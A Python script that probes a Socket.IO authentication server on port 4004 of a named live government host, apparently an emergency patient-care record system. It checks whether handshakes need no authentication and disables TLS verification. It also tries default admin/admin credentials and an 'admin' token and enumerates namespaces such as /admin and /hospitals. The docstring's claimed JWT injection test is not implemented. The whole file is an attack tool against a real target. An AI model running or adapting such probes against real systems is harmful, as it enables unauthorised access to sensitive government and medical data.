#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
4004 authServer Socket.IO 完整探测：
- 验证握手/SID 无鉴权
- 试探业务事件名（login/subscribe/auth/authenticate/refresh/disconnect 等）
- 测试客户端 JWT 注入
"""
import socket, ssl, time, json, base64, os, urllib.parse

HOST = "epcr.tpf.gov.tw"
PORT = 4004

def https_request(host, port, path, headers=None, body=None, method="GET"):
    """Send raw HTTPS request and return (status, headers, body)"""
    h = headers or {}
    body_str = body if isinstance(body, str) else (json.dumps(body) if body else "")
    h.setdefault("Host", f"{host}:{port}")
    h.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) CyberStrike/1.0")
    h.setdefault("Accept", "*/*")
    h.setdefault("Connection", "close")
    
    request_line = f"{method} {path} HTTP/1.1"
    raw = f"{request_line}\r\n"
    for k, v in h.items():
        raw += f"{k}: {v}\r\n"
    raw += "\r\n"
    if body_str:
        raw += body_str
    
    sock = socket.create_connection((host, port), timeout=10)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ssock = ctx.wrap_socket(sock, server_hostname=host)
    ssock.send(raw.encode())
    
    response = b""
    try:
        while True:
            chunk = ssock.recv(65536)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    finally:
        ssock.close()
    
    # parse
    head, _, body_bytes = response.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status_line = lines[0].decode(errors='replace')
    headers_dict = {}
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            headers_dict[k.decode(errors='replace').strip()] = v.decode(errors='replace').strip()
    return status_line, headers_dict, body_bytes

def get_sid(host, port, ns="", headers=None):
    """Open Socket.IO v4 polling handshake and return SID"""
    path = f"/socket.io/?EIO=4&transport=polling"
    if ns:
        path += f"&ns={urllib.parse.quote(ns)}"
    status, headers, body = https_request(host, port, path, headers=headers)
    print(f"[GET {ns or '/'}] {status[:50]}")
    body_text = body.decode(errors='replace')
    # body is like "97:0{...JSON...}"
    if body_text.startswith("0") or ":" in body_text:
        # Extract JSON payload after the prefix number
        colon_pos = body_text.find("{")
        if colon_pos > 0:
            try:
                payload = json.loads(body_text[colon_pos:body_text.rfind("}")+1])
                return payload.get("sid"), headers
            except:
                pass
    return None, headers

def post_eio_packet(host, port, sid, packet, ns=""):
    """POST Engine.IO packet to /socket.io/"""
    body = f"{len(packet)}:{packet}"
    path = f"/socket.io/?EIO=4&transport=polling&sid={sid}"
    if ns:
        path += f"&ns={urllib.parse.quote(ns)}"
    headers = {
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": "https://epcr.tpf.gov.tw",
        "Referer": "https://epcr.tpf.gov.tw/"
    }
    status, hdrs, body_bytes = https_request(host, port, path, headers=headers, body=body, method="POST")
    return status, hdrs, body_bytes.decode(errors='replace')

def main():
    print("="*80)
    print(f"4004 authServer Socket.IO 完整探测")
    print("="*80)
    
    # Step 1: 根 NS 握手（无 token）
    print("\n[Step 1] 根 NS 握手（无 token）")
    sid, hdrs = get_sid(HOST, PORT, ns="")
    print(f"  SID = {sid}")
    print(f"  Set-Cookie = {hdrs.get('set-cookie', '(none)')[:100]}")
    
    # Step 2: 拿 SID 后 POST CONNECT 包
    print("\n[Step 2] POST Engine.IO CONNECT (40)")
    if sid:
        status, hdrs, body = post_eio_packet(HOST, PORT, sid, "40", ns="")
        print(f"  Status: {status[:80]}")
        print(f"  Body: {body[:200]}")
    
    # Step 3: 测试业务事件 - subscribe/login/authenticate/refresh
    events = [
        '42["subscribe",{}]',
        '42["client.subscribe",{}]',
        '42["login",{"username":"admin","password":"admin"}]',
        '42["authenticate",{"token":"admin"}]',
        '42["auth",{}]',
        '42["client.login",{}]',
        '42["server.login",{}]',
        '42["connect",{}]',
        '42["refresh",{}]',
        '42["ping",{}]',
    ]
    for ev in events:
        status, hdrs, body = post_eio_packet(HOST, PORT, sid, ev, ns="")
        print(f"  POST {ev[:60]} -> {status[:30]} body={body[:80]}")
        time.sleep(0.2)
    
    # Step 4: 试探 4004 常见 namespace
    print("\n[Step 4] 测试 4004 namespaces")
    for ns_name in ["", "/", "/admin", "/auth", "/login", "/socket", "/events", "/hospitals", "/monitor"]:
        s, h = get_sid(HOST, PORT, ns=ns_name if ns_name.startswith("/") else (ns_name if ns_name else ""))
        print(f"  NS '{ns_name}': SID = {s}")

if __name__ == "__main__":
    main()
